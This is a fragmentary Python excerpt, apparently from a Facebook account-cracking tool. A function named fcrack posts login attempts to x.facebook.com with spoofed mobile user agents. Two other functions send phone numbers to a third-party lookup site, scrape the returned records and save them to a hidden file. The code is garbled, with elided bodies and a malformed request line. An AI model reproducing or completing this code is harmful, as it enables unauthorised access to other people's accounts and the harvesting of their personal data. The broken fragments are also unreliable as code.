...
def fcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			lo = session.post('https://x.facebook.com/', cookies=cookies, headers=headers)data=log_data,headers=header_freefb).text
...
def cinc():
    ...
    linex()
    head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Infinix X676C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]'
    data = {'cnnum': nmbr}
...
def zong():
    ...
    if num[0] == '0':
        ...
        nmbr = num
    head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; Infinix X6516 Build/SP1A.210812.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.130 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]'
    data = {'cnnum': nmbr}
    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
    dta = re.findall("\<div(.*?)</table>",str(url.text))
    open(".tt1.txt","w").write(str(dta))
